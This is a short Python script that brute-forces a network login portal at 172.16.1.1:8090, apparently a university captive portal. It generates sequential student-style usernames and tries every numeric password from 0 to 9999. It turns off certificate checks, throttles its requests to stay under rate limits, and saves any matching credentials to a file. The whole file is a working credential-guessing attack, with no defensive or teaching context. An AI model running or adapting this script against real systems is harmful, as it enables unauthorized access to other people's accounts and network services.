__author__ = 'Patrick'
import requests
import sys
import time
f = open("password.txt",'a')
for j in range(1002,1010):
	username = 'phdee'+str(j)+'2011'
	for i in range(0, 10000):
		password = str(i)
		print (password)
		dataToSend ={'mode': '191','isAccessDenied': '', 'url': '', 'username': username , 'password': password , 'saveinfo': ''}
		try:
			r = requests.post('https://172.16.1.1:8090/httpclient.html', data=dataToSend,verify=False)
		except requests.ConnectionError:
			time.sleep(2)
			r = requests.post('https://172.16.1.1:8090/httpclient.html', data=dataToSend,verify=False)
		if r.text.count('in'):
			print 'ID Found '+username+' '+password
			print >>f, username + ' ** ' + password
			break
		if r.text.count('Limit'):
			print 'ID Found'
			print >>f, username + ' ** ' + password
			break
		if(i%50==0):
			time.sleep(1)
		if(i%200==0):
			time.sleep(3)
	print (username + ' checked')
